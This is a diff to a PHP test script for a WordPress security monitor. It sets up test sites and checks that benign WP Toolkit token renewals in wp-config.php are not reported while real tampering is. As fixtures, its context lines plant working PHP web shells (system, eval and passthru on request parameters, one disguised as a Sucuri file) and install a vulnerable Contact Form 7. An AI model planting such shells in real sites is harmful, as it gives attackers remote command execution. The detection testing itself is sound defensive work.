@@ -192,6 +192,9 @@ foreach ($sites as [$path, $user, $db, $url]) {
 }
 // Bob keeps wp-config.php one level above WordPress (supported by WordPress).
 rename(BOB . '/wp-config.php', dirname(BOB) . '/wp-config.php');
+// WP Toolkit keeps an API token in wp-config.php, and renews it.
+put(dirname(BOB) . '/wp-config.php', preg_replace('/^<\?php\n/', "<?php\ndefine( 'WP_TOOLKIT_API_TOKEN', 'eyJ.first.sig' );\n",
+    (string) file_get_contents(dirname(BOB) . '/wp-config.php')), 'bob');
 // Alice runs a vulnerable Contact Form 7 and has harmless PHP in uploads: a "Silence is golden" stub,
 // a compiled Twig template (WPML cache), Sucuri data files and dompdf font metrics.
 wp('alice', ALICE, ['plugin', 'install', 'contact-form-7', '--version=5.3.1', '--activate', '--quiet']);
@@ -314,6 +317,8 @@ put(ALICE . '/wp-admin/shell.php', "<?php system(\$_GET['c']);\n", 'alice');
 unlink(ALICE . '/readme.html');
 put(ALICE . '/radio.php', "<?php eval(\$_POST['x']);\n", 'alice');
 put(ALICE . '/wp-config.php', "\n// tampered\n", 'alice', true);
+// Not an attack either: WP Toolkit renewing its token in bob's wp-config.php.
+put(dirname(BOB) . '/wp-config.php', str_replace('eyJ.first.sig', 'eyJ.second.sig', (string) file_get_contents(dirname(BOB) . '/wp-config.php')), 'bob');
 // A web shell dressed as a Sucuri data file: its exit comes too late.
 put(ALICE . '/wp-content/uploads/sucuri/sucuri-cmd.php', "<?php passthru(\$_GET['c']); exit(0); ?>\n", 'alice');
 put(ALICE . '/wp-content/uploads/2026/09/photo.php.jpg', "<?php phpinfo();\n", 'alice');
@@ -361,6 +366,9 @@ foreach ([
 ] as $needle) {
     expect($needle, has($integrity, $needle), $integrity);
 }
+expect('wp-config.php change detailed', has($integrity, 'modified: wp-config.php (only comments or blank space changed)'), $integrity);
+expect('WP Toolkit token renewed: not reported', !has($integrity, '../wp-config.php') && has(
+    (string) file_get_contents('/var/lib/wp-secmon/sites/' . substr(hash('sha256', BOB), 0, 12) . '/files.json'), 'WP_TOOLKIT_API_TOKEN'), $integrity);
 $html = mailHtml($integrityMail);
 expect('e-mail: advice without the file list', has($html, 'The uploads folder, which should only hold images and documents, contains 2 PHP or script files')
     && has($html, 'Turn off &quot;Anyone can register&quot;') && !has($html, 'photo.php.jpg') && !has($integrityMail, 'photo.php.jpg'), $html);
